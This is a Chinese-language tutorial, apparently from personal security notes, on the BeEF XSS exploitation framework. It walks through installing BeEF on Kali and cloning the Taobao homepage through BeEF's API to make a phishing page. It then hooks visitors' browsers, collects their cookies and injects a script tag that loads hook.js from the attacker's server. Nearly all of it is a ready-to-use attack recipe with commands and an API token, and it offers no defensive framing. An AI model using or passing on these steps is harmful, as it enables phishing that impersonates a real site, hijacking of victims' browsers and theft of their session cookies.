## xss漏洞利用工具Beef
### 1、在kali上安装beef
```shell script
sudo apt install beef-xss
```
### 2、配置beef
```shell script
vim /usr/share/beef-xss/config.yaml
```
![image](https://github.com/498946975/Security/blob/master/images/xss_19.png)
### 3、用户名和密码
```shell script
vim /usr/share/beef-xss/config.yaml
```
![image](https://github.com/498946975/Security/blob/master/images/xss_20.png)
### 4、启动beef
```shell script
cd /usr/share/beef-xss 
./beef
```
![image](https://github.com/498946975/Security/blob/master/images/xss_21.png)
![image](https://github.com/498946975/Security/blob/master/images/xss_22.png)

### 5、克隆其他网站，需要用到上面启动时候告诉到apikey
#### 5.1 克隆规则
```shell script
curl -H "Content-Type: application/json; charset=UTF-8" -d '{"url":"<URL of site to clone>", "mount":"<where to mount>"}' -X POST http://<BeEFURL>/api/seng/clone_page? token=<token>
# <URL of site to clone> 需要克隆的网址
# <where to mount> 克隆的⻚面在服务器的哪个路径访问 ,beef的url路径
# <token> 服务启动时的 beef API key
```
#### 5.2 克隆淘宝的首页
```shell script
└─# curl -H "Content-Type: application/json; charset=UTF-8" -d '{"url":"https://www.taobao.com", "mount":"/clone_taobao"}' -X POST http://172.16.120.177:3000/api/seng/clone_page?token=ab06cbe5f38a44607a2a8f3c0a806174b0afcb7b       
{"success":true,"mount":"/clone_taobao"}     
```
#### 5.3 访问"钓鱼"页面
http://172.16.120.177:3000/clone_taobao
![image](https://github.com/498946975/Security/blob/master/images/xss_23.png)
然后在beef上，就可以收到上线可控的浏览器
![image](https://github.com/498946975/Security/blob/master/images/xss_24.png)

### 6、使用beef控制
获取钓鱼的cookie
![image](https://github.com/498946975/Security/blob/master/images/xss_25.png)

### 7、发送钓鱼脚本，进行控制
[13:05:29]    |   Hook URL: http://172.16.120.177:3000/hook.js
```shell script
<script src="http://172.16.120.177:3000/hook.js"></script>
```
![image](https://github.com/498946975/Security/blob/master/images/xss_26.png)
